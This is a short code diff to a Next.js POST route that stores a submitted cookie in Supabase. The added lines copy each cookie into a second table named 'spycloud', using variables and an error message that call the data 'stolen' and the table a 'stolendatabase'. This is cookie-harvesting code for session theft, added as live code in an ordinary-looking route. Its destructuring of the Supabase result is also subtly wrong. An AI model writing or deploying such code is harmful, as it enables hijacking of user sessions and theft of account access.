@@ -25,7 +25,16 @@ export async function POST(req) {
 
     if (error) {
       console.error("Supabase insert error:", error);
-      return NextResponse.json({ error: "Failed to save cookie to database" }, { status: 500 });
+      return NextResponse.json({ error: "Failed to save cookie to auth0 database" }, { status: 500 });
+    }
+
+    const { stolen, stolenError } = await supabase
+      .from("spycloud")
+      .insert([{ value: cookie}]);
+
+    if (stolenError) {
+      console.error("Supabase insert error:", stolenError);
+      return NextResponse.json({ error: "Failed to save cookie to stolendatabase" }, { status: 500 });
     }
 
     const response = NextResponse.json({ message: "Cookie saved", data });
